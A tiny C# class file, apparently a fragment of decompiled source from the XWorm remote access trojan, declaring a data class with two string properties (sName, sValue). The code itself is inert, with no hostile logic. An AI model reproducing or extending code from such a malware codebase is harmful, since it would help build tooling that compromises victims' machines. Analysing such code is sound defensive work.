namespace XWorm;

public class GClass13 : GClass12
{
	public string sName { get; set; }

	public string sValue { get; set; }
}